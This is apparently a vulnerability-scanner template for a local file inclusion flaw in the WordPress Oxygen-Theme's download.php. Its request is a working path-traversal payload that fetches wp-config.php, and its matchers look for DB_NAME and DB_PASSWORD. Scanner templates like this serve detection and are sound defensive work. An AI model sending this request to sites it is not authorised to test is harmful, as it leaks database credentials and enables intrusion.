id: "wp-oxygen-theme-lfi"
name: "WordPress Oxygen-Theme - Local File Inclusion"
severity: "high"
description: "WordPress Oxygen-Theme has a local file inclusion vulnerability via the 'file' parameter of 'download.php'."
tech:
  - "wordpress"
  - "php"
tags:
  - "wordpress"
  - "wp-theme"
  - "lfi"
  - "vuln"
cwe: "CWE-22"
reference: "https://cxsecurity.com/issue/WLB-2019030178"
spaExclusion: true
request:
  method: "GET"
  path: "/wp-content/themes/oxygen-theme/download.php?file=../../../wp-config.php"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "DB_NAME"
      - "DB_PASSWORD"
    condition: "and"
  - type: "status"
    status:
      - 200
